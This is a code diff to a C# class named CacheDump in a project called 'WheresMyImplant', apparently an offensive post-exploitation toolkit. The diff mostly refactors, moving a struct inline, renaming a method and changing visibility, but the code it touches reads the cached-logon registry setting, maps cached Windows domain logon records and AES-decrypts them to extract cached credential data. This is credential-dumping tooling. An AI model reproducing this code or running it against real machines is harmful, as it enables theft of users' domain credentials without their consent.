@@ -8,16 +8,79 @@ using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
 
+using Unmanaged;
+
 namespace WheresMyImplant
 {
     class CacheDump : Base
     {
-        public Boolean croak = false;
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        private struct CacheData
+        {
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] userNameLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] domainNameLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] effectiveNameLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] fullNameLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] logonScriptLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] profilePathLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] homeDirectoryLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] homeDirectoryDriveLength;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] userId;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] primaryGroupId;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] groupCount;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] logonDomainNameLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] logonDomainIdLength;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] lastAccess;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] lastAccessTime;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] revision;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] sidCount;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] valid;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] iterationCount;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] sifLength;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+            internal Byte[] logonPackage;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] dnsDomainNameLength;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+            internal Byte[] upnLength;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            internal Byte[] challenge;
+        }
+
+        internal Boolean croak = false;
 
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public CacheDump()
+        internal CacheDump()
         {
             String logonCount = (String)Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "CachedLogonsCount");
             WriteOutputNeutral(String.Format("{0} Cached Logons Set", logonCount));
@@ -34,7 +97,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        private void parseDecryptedData(ref Structs.CacheData cacheData, ref Byte[] decrypted)
+        private void ParseDecryptedData(ref CacheData cacheData, ref Byte[] decrypted)
         {
             ////////////////////////////////////////////////////////////////////////////////
             Int32 offset = 72;
@@ -85,7 +148,7 @@ namespace WheresMyImplant
                 ////////////////////////////////////////////////////////////////////////////////
                 GCHandle pinnedArray = GCHandle.Alloc(data, GCHandleType.Pinned);
                 IntPtr bytesPtr = pinnedArray.AddrOfPinnedObject();
-                Structs.CacheData cacheData = (Structs.CacheData)Marshal.PtrToStructure(bytesPtr, typeof(Structs.CacheData));
+                CacheData cacheData = (CacheData)Marshal.PtrToStructure(bytesPtr, typeof(CacheData));
 
                 ////////////////////////////////////////////////////////////////////////////////
                 if (cacheData.userNameLength[0] == (byte)00)
@@ -118,7 +181,7 @@ namespace WheresMyImplant
                         aesDecrypted = Misc.Combine(aesDecrypted, decryptor.TransformFinalBlock(encData, i, 16));
                     }
                 }
-                parseDecryptedData(ref cacheData, ref aesDecrypted);
+                ParseDecryptedData(ref cacheData, ref aesDecrypted);
             }
         }
 
